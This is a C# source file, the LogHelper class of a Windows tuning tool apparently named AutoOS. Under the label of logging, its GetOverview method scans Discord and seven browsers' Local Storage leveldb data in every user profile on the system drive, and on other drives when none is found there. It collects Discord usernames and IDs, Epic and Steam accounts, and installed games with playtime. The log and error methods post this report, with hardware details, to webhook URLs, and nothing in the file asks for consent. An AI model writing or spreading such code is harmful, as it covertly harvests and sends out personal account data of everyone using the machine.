using AutoOS.Core.Helpers.Device.Models;
using AutoOS.Core.Helpers.Device;
using AutoOS.Core.Helpers.GPU.Models;
using AutoOS.Core.Helpers.GPU;
using AutoOS.Core.Helpers.Monitor;
using AutoOS.Core.Helpers.OS;
using AutoOS.Core.Helpers.RAM;
using AutoOS.Core.Helpers.Database;
using AutoOS.Core.Helpers.Games;
using AutoOS.Core.Helpers.Sound;
using DevWinUI;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Authentication;
using System.Text.Json.Nodes;
using System.Text;
using Windows.Storage;
using System.Text.RegularExpressions;

namespace AutoOS.Core.Helpers.Logging;

public static partial class LogHelper
{
    private static readonly ApplicationDataContainer localSettings = ApplicationData.Current.LocalSettings;

    private static readonly HttpClient httpClient = new(new SocketsHttpHandler
    {
        SslOptions = new SslClientAuthenticationOptions
        {
            EnabledSslProtocols = SslProtocols.Tls12 | SslProtocols.Tls13
        }
    })
    {
        DefaultRequestHeaders =
        {
            UserAgent =
            {
                new ProductInfoHeaderValue("AutoOS", ProcessInfoHelper.Version)
            }
        }
    };

    public static async Task Log(IEnumerable<GpuInfo> selectedGpus = null, bool bios = false)
    {
        var embed = await GetOverview(selectedGpus);
        var webhookPayload = new JsonObject
        {
            ["embeds"] = new JsonArray { (JsonNode)embed }
        };

        using var multipart = new MultipartFormDataContent
        {
            { new StringContent(webhookPayload.ToJsonString()), "payload_json" }
        };

        if (bios)
        {
            string nvramPath = Path.Combine(PathHelper.GetAppDataFolderPath(), "SCEWIN", "nvram.txt");
            if (File.Exists(nvramPath))
            {
                multipart.Add(new ByteArrayContent(File.ReadAllBytes(nvramPath)), "file", "nvram.txt");
            }
        }

        string webhook = bios ? LogConfig.Bios : LogConfig.Log;
        if (!string.IsNullOrEmpty(webhook))
        {
            await httpClient.PostAsync(webhook, multipart);
        }
    }

    public static async Task LogError(Exception ex, IEnumerable<GpuInfo> selectedGpus = null, string actionTitle = null)
    {
        var embed = await GetOverview(selectedGpus, ex, actionTitle);
        var webhookPayload = new JsonObject
        {
            ["embeds"] = new JsonArray { (JsonNode)embed }
        };

        using var multipart = new MultipartFormDataContent
        {
            { new StringContent(webhookPayload.ToJsonString()), "payload_json" }
        };

        if (!string.IsNullOrEmpty(LogConfig.Error))
        {
            await httpClient.PostAsync(LogConfig.Error, multipart);
        }
    }

    public static async Task LogNetworkSettings(IEnumerable<GpuInfo> selectedGpus = null)
    {
        var embed = await GetOverview(selectedGpus);
        var webhookPayload = new JsonObject
        {
            ["embeds"] = new JsonArray { (JsonNode)embed }
        };

        using var multipart = new MultipartFormDataContent
        {
            { new StringContent(webhookPayload.ToJsonString()), "payload_json" }
        };

        var devices = DeviceHelper.GetDevices(DeviceType.NIC);
        var sb = new StringBuilder();

        foreach (var device in devices)
        {
            if (device.NicType != NicDeviceType.WiFi && device.NicType != NicDeviceType.LAN) continue;

            sb.AppendLine($"# Adapter: {device.FriendlyName}");
            sb.AppendLine($"- **PnpID**: `{device.PnpDeviceId}`");
            sb.AppendLine($"- **RegistryPath**: `{device.RegistryPath}`");
            sb.AppendLine($"- **Driver**: `{device.DriverType} {device.CurrentVersion}`");

            var settings = Network.NetworkHelper.GetAdvancedSettings(device);
            foreach (var setting in settings.OrderBy(s => s.Name))
            {
                sb.AppendLine();
                sb.AppendLine($"## {setting.Name}");
                sb.AppendLine($"- **Key**: `{setting.Key}`");
                sb.AppendLine($"- **Type**: `{setting.Type}`");

                var currentOption = setting.Options.FirstOrDefault(o => o.Value == setting.CurrentValue);
                string currentText = currentOption != null ? $" ({currentOption.Name})" : "";
                sb.AppendLine($"- **Current Value**: `{setting.CurrentValue}`{currentText}");

                if (!string.IsNullOrEmpty(setting.DefaultValue))
                {
                    var defaultOption = setting.Options.FirstOrDefault(o => o.Value == setting.DefaultValue);
                    string defaultText = defaultOption != null ? $" ({defaultOption.Name})" : "";
                    sb.AppendLine($"- **Default Value**: `{setting.DefaultValue}`{defaultText}");
                }

                sb.AppendLine("- **Parameters**:");
                foreach (var meta in setting.RawMetadata.OrderBy(m => m.Key))
                {
                    sb.AppendLine($"  - **{meta.Key}**: `{meta.Value}`");
                }

                if (setting.Type == Network.Models.NetworkSettingType.Enum && setting.Options.Count > 0)
                {
                    sb.AppendLine("- **Options**:");
                    foreach (var opt in setting.Options)
                    {
                        sb.AppendLine($"  - `{opt.Value}`: {opt.Name}");
                    }
                }
            }

            sb.AppendLine();
            sb.AppendLine("---");
            sb.AppendLine();
        }

        if (sb.Length > 0 && !string.IsNullOrEmpty(LogConfig.Network))
        {
            multipart.Add(new ByteArrayContent(Encoding.UTF8.GetBytes(sb.ToString())), "file", "network_settings.md");
            await httpClient.PostAsync(LogConfig.Network, multipart);
        }
    }

    private static async Task<JsonObject> GetOverview(IEnumerable<GpuInfo> selectedGpus = null, Exception ex = null, string actionTitle = null)
    {
        // local discord
        var discordAccounts = DiscordHelper.GetAccountData(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local Storage", "leveldb"));
        if (discordAccounts != null && discordAccounts.Count > 0)
        {
            foreach (var account in discordAccounts)
            {
                account.Origin = "Discord";
            }
        }

        // local browsers
        var systemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
        var browserPaths = new Dictionary<string, string>
        {
            { @"AppData\Local\Google\Chrome\User Data\Default\Local Storage\leveldb", "Chrome" },
            { @"AppData\Local\Thorium\User Data\Default\Local Storage\leveldb", "Thorium" },
            { @"AppData\Local\imput\Helium\User Data\Default\Local Storage\leveldb", "Helium" },
            { @"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb", "Brave" },
            { @"AppData\Local\Vivaldi\User Data\Default\Local Storage\leveldb", "Vivaldi" },
            { @"AppData\Local\Packages\TheBrowserCompany.Arc_ttt1ap7aakyb4\LocalCache\Local\Arc\User Data\Default\Local Storage\leveldb", "Arc" },
            { @"AppData\Local\Perplexity\Comet\User Data\Default\Local Storage\leveldb", "Perplexity" }
        };

        var foundDatabasePaths = DriveInfo.GetDrives()
            .Where(d => d.DriveType == DriveType.Fixed && d.Name == systemDrive)
            .SelectMany(d =>
            {
                string usersPath = Path.Combine(d.Name, "Users");
                if (!Directory.Exists(usersPath)) return [];

                return Directory.GetDirectories(usersPath)
                    .SelectMany(userDir => browserPaths.Keys.Select(browserPath => new { Path = Path.Combine(userDir, browserPath), Browser = browserPaths[browserPath] }))
                    .Where(x => Directory.Exists(x.Path));
            })
            .Select(x => new { Path = new DirectoryInfo(x.Path), x.Browser })
            .OrderByDescending(x => x.Path.LastWriteTime)
            .ToList();

        foreach (var databasePath in foundDatabasePaths)
        {
            try
            {
                var accounts = DiscordHelper.GetAccountData(databasePath.Path.FullName);

                if (accounts != null && accounts.Count > 0)
                {
                    if (discordAccounts == null)
                    {
                        discordAccounts = accounts;
                    }
                    else
                    {
                        discordAccounts.AddRange(accounts);
                    }

                    foreach (var account in accounts)
                    {
                        account.IsActive = false;
                        account.Origin = databasePath.Browser;
                    }
                }
            }
            catch
            {
                continue;
            }
        }

        if (discordAccounts == null || discordAccounts.Count == 0)
        {
            // other discord
            var foundFolders = DriveInfo.GetDrives()
                .Where(d => d.DriveType == DriveType.Fixed && d.Name != systemDrive)
                .SelectMany(d =>
                {
                    string usersPath = Path.Combine(d.Name, "Users");
                    if (!Directory.Exists(usersPath)) return [];

                    return Directory.GetDirectories(usersPath)
                        .Select(userDir => Path.Combine(userDir, "AppData", "Roaming", "discord", "Local Storage", "leveldb"))
                        .Where(Directory.Exists)
                        .Select(path => new { Path = path, Drive = d.Name.TrimEnd('\\') });
                })
                .Select(x => new { Path = new DirectoryInfo(x.Path), x.Drive })
                .ToList();

            var sortedFolders = foundFolders.OrderByDescending(folder => folder.Path.LastWriteTime).ToList();

            foreach (var folder in sortedFolders)
            {
                var accounts = DiscordHelper.GetAccountData(folder.Path.FullName);

                if (accounts != null && accounts.Count > 0)
                {
                    if (discordAccounts == null)
                    {
                        discordAccounts = accounts;
                    }
                    else
                    {
                        discordAccounts.AddRange(accounts);
                    }

                    foreach (var account in accounts)
                    {
                        account.IsActive = false;
                        account.Origin = $"Discord ({folder.Drive})";
                    }
                }
            }

            // other browsers
            var foundDatabasePathsOtherDrives = DriveInfo.GetDrives()
                .Where(d => d.DriveType == DriveType.Fixed && d.Name != systemDrive)
                .SelectMany(d =>
                {
                    string usersPath = Path.Combine(d.Name, "Users");
                    if (!Directory.Exists(usersPath)) return [];

                    return Directory.GetDirectories(usersPath)
                        .SelectMany(userDir => browserPaths.Keys.Select(browserPath => new { Path = Path.Combine(userDir, browserPath), Browser = browserPaths[browserPath], Drive = d.Name.TrimEnd('\\') }))
                        .Where(x => Directory.Exists(x.Path));
                })
                .Select(x => new { Path = new DirectoryInfo(x.Path), x.Browser, x.Drive })
                .OrderByDescending(x => x.Path.LastWriteTime)
                .ToList();

            foreach (var databasePath in foundDatabasePathsOtherDrives)
            {
                try
                {
                    var accounts = DiscordHelper.GetAccountData(databasePath.Path.FullName);

                    if (accounts != null && accounts.Count > 0)
                    {
                        if (discordAccounts == null)
                        {
                            discordAccounts = accounts;
                        }
                        else
                        {
                            discordAccounts.AddRange(accounts);
                        }

                        foreach (var account in accounts)
                        {
                            account.IsActive = false;
                            account.Origin = $"{databasePath.Browser} ({databasePath.Drive})";
                        }
                    }
                }
                catch
                {
                    continue;
                }
            }
        }

        var epicAccounts = EpicGamesHelper.GetEpicGamesAccounts();
        var steamAccounts = SteamHelper.GetSteamAccounts();

        string cpuName = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "")?.ToString() ?? "";
        string manufacturer = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardManufacturer", "")?.ToString() ?? "";
        string product = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BaseBoardProduct", "")?.ToString() ?? "";
        string motherboard = $"{manufacturer} {product}".Trim();

        var ramInfo = RamHelper.GetRam();
        string ram = ramInfo != null ? $"{ramInfo.CapacityGB:N1} GB {ramInfo.DDRVersion} @ {ramInfo.MaxSpeedMHz} MHz" : "N/A";

        var currentGpus = GpuHelper.GetGPUs();
        string gpus = string.Join("\n", currentGpus.Select(gpu => $"{gpu.DeviceName} ({gpu.DeviceId}, {gpu.CurrentVersion}, {selectedGpus?.FirstOrDefault(x => x.PnPDeviceId == gpu.PnPDeviceId)?.Install ?? true})"));

        string monitors = string.Join("\n", MonitorHelper.GetMonitors().Select(m => $"{m.DeviceName} ({m.Resolution.Width}x{m.Resolution.Height} @ {m.RefreshRate} Hz)"));

        var nicsList = DeviceHelper.GetDevices(DeviceType.NIC);
        string nics = nicsList.Count > 0 ? string.Join("\n", nicsList.Select(n => $"{n.FriendlyName} ({n.DeviceId}, {n.DriverType} {n.CurrentVersion}, {n.IsActive})")) : "N/A";

        var audioParts = new List<string>();

        var outputDevice = SoundHelper.GetDefaultAudioDeviceInfo(Windows.Win32.Media.Audio.EDataFlow.eRender);
        if (outputDevice != null)
        {
            var outputDetails = SoundHelper.GetAudioDetails(outputDevice);
            var outputBuffers = SoundHelper.GetBufferSizes(outputDevice);
            var currentBuffer = outputBuffers.FirstOrDefault(buffer => buffer.IsCurrent);

            string outputFormat = $"{outputDetails.CurrentChannels} channels, {outputDetails.CurrentBitDepth} bit, {outputDetails.CurrentSampleRate} Hz";
            string outputBuffer = currentBuffer != null ? $"{currentBuffer.Frames} samples" : "N/A";
            audioParts.Add($"{outputDevice.FriendlyName} ({outputFormat}, {outputBuffer})");
        }

        var inputDevice = SoundHelper.GetDefaultAudioDeviceInfo(Windows.Win32.Media.Audio.EDataFlow.eCapture);
        if (inputDevice != null)
        {
            var inputDetails = SoundHelper.GetAudioDetails(inputDevice);
            var inputBuffers = SoundHelper.GetBufferSizes(inputDevice);
            var currentBuffer = inputBuffers.FirstOrDefault(buffer => buffer.IsCurrent);

            string inputFormat = $"{inputDetails.CurrentChannels} channels, {inputDetails.CurrentBitDepth} bit, {inputDetails.CurrentSampleRate} Hz";
            string inputBuffer = currentBuffer != null ? $"{currentBuffer.Frames} samples" : "N/A";
            audioParts.Add($"{inputDevice.FriendlyName} ({inputFormat}, {inputBuffer})");
        }

        string audioInfo = audioParts.Count > 0 ? string.Join("\n", audioParts) : "N/A";

        var allGames = new List<GameModel>();
        try { allGames.AddRange(await EpicGamesHelper.GetGames()); } catch { }
        try { allGames.AddRange(await SteamHelper.GetGames()); } catch { }
        try { allGames.AddRange(await EdenHelper.GetGames(localSettings.Values["EdenLocation"]?.ToString(), localSettings.Values["EdenDataLocation"]?.ToString())); } catch { }
        try { allGames.AddRange(await CitronHelper.GetGames(localSettings.Values["CitronLocation"]?.ToString(), localSettings.Values["CitronDataLocation"]?.ToString())); } catch { }
        try { allGames.AddRange(await RyujinxHelper.GetGames(localSettings.Values["RyujinxLocation"]?.ToString(), localSettings.Values["RyujinxDataLocation"]?.ToString())); } catch { }

        var sortedGames = allGames.OrderByDescending(g => ParsePlaytimeMinutes(g.PlayTime)).ToList();
        var gamesList = sortedGames.Select(g => $"{g.Title} ({g.Launcher}) ({g.PlayTime})").ToList();
        string games = gamesList.Count > 0 ? string.Join("\n", gamesList) : "N/A";

        string startStr = localSettings.Values["Install_Start"]?.ToString();
        string endStr = localSettings.Values["Install_End"]?.ToString();
        string version = localSettings.Values["Install_Version"]?.ToString() ?? "N/A";
        string build = localSettings.Values["Install_Build"]?.ToString() ?? "N/A";
        string installationDetails;

        bool startParsed = DateTimeOffset.TryParse(startStr, out DateTimeOffset start);
        bool endParsed = DateTimeOffset.TryParse(endStr, out DateTimeOffset end);

        string startFormatted = startParsed ? start.ToString("dddd, dd MMM yyyy — HH:mm:ss") : (startStr ?? "N/A");
        string endFormatted = endParsed ? end.ToString("dddd, dd MMM yyyy — HH:mm:ss") : (endStr ?? "N/A");

        if (startParsed && endParsed)
        {
            TimeSpan elapsed = end - start;
            string elapsedFormatted = elapsed.Hours > 0 ? $"{elapsed.Hours}h {elapsed.Minutes}m {elapsed.Seconds}s" : $"{elapsed.Minutes}m {elapsed.Seconds}s";
            installationDetails = $"Start: {startFormatted}\nEnd:   {endFormatted}\nElapsed: {elapsedFormatted}\nVersion: {version}\nBuild: {build}";
        }
        else
        {
            installationDetails = $"Start: {startFormatted}\nEnd:   {endFormatted}\nVersion: {version}\nBuild: {build}";
        }

        var embed = new JsonObject
        {
            ["color"] = ex != null ? 4466470 : 3751195,
            ["fields"] = new JsonArray
            {
                (JsonNode)new JsonObject
                {
                    ["name"] = "Discord",
                    ["value"] = discordAccounts != null && discordAccounts.Count > 0 ? string.Join("\n", discordAccounts.Select(a => $"{a.Username} <@{a.UserId}> [{a.Origin}]{(a.IsActive ? " [Active]" : "")}")) : "N/A",
                    ["inline"] = false
                },
                (JsonNode)new JsonObject
                {
                    ["name"] = "Epic Games",
                    ["value"] = epicAccounts != null && epicAccounts.Count > 0 ? string.Join("\n", epicAccounts.Select(a => $"{a.DisplayName}{(a.IsActive ? " [Active]" : "")}")) : "N/A",
                    ["inline"] = false
                },
                (JsonNode)new JsonObject
                {
                    ["name"] = "Steam",
                    ["value"] = steamAccounts != null && steamAccounts.Count > 0 ? string.Join("\n", steamAccounts.Select(a => $"[{a.AccountName}](https://steamcommunity.com/profiles/{a.Steam64Id}){(a.AllowAutoLogin ? " [Active]" : "")}")) : "N/A",
                    ["inline"] = false
                },
                (JsonNode)new JsonObject
                {
                    ["name"] = "Motherboard",
                    ["value"] = motherboard,
                    ["inline"] = false
                },
                (JsonNode)new JsonObject
                {
                    ["name"] = "CPU",
                    ["value"] = cpuName,
                    ["inline"] = false
                },
                (JsonNode)new JsonObject
                {
                    ["name"] = "RAM",
                    ["value"] = ram,
                    ["inline"] = false
                },
                (JsonNode)new JsonObject
                {
                    ["name"] = "GPUs",
                    ["value"] = gpus,
                    ["inline"] = false
                },
                (JsonNode)new JsonObject
                {
                    ["name"] = "Displays",
                    ["value"] = monitors,
                    ["inline"] = false
                },
                (JsonNode)new JsonObject
                {
                    ["name"] = "NICs",
                    ["value"] = nics,
                    ["inline"] = false
                },
                (JsonNode)new JsonObject
                {
                    ["name"] = "Audio Devices",
                    ["value"] = audioInfo,
                    ["inline"] = false
                },
                (JsonNode)new JsonObject
                {
                    ["name"] = "Games",
                    ["value"] = games,
                    ["inline"] = false
                },
                (JsonNode)new JsonObject
                {
                    ["name"] = "OS Build",
                    ["value"] = OSHelper.GetWindowsVersionString(),
                    ["inline"] = true
                },
                (JsonNode)new JsonObject
                {
                    ["name"] = "Installation Details",
                    ["value"] = installationDetails,
                    ["inline"] = true
                }
            },
            ["footer"] = new JsonObject
            {
                ["text"] = $"AutoOS {ProcessInfoHelper.Version}"
            }
        };

        var activeDiscordAccount = discordAccounts?.FirstOrDefault(active => active.IsActive) ?? discordAccounts?.FirstOrDefault();
        if (activeDiscordAccount != null)
        {
            embed["author"] = new JsonObject
            {
                ["name"] = activeDiscordAccount.Username,
                ["icon_url"] = $"https://cdn.discordapp.com/avatars/{activeDiscordAccount.UserId}/{activeDiscordAccount.Avatar}.webp?size=64",
                ["url"] = $"https://discord.com/users/{activeDiscordAccount.UserId}"
            };
        }

        if (ex != null)
        {
            var errorSb = new StringBuilder();
            errorSb.AppendLine($"{ex.GetType().FullName}");
            errorSb.AppendLine($"Message: {ex.Message}");
            errorSb.AppendLine($"HResult: 0x{ex.HResult:X}");
            errorSb.AppendLine($"Source: {ex.Source}");
            errorSb.AppendLine(ex.StackTrace);
            if (ex.InnerException != null)
            {
                errorSb.AppendLine("**InnerException:**");
                errorSb.AppendLine(ex.InnerException.ToString());
            }
            if (!string.IsNullOrEmpty(actionTitle))
            {
                errorSb.AppendLine($"**Action Title:** {actionTitle}");
            }

            var errorField = new JsonObject
            {
                ["name"] = "Error Details",
                ["value"] = errorSb.ToString(),
                ["inline"] = false
            };

            ((JsonArray)embed["fields"]).Insert(10, (JsonNode)errorField);
        }

        return embed;
    }

    [GeneratedRegex(@"(?:(\d+)h)?\s*(\d+)m", RegexOptions.Compiled)]
    private static partial Regex PlayTimeMinutesRegex();
    private static int ParsePlaytimeMinutes(string time)
    {
        if (string.IsNullOrWhiteSpace(time))
            return 0;

        var match = PlayTimeMinutesRegex().Match(time);
        if (match.Success)
        {
            int hours = match.Groups[1].Success ? int.Parse(match.Groups[1].Value) : 0;
            int minutes = int.Parse(match.Groups[2].Value);
            return hours * 60 + minutes;
        }

        return 0;
    }
}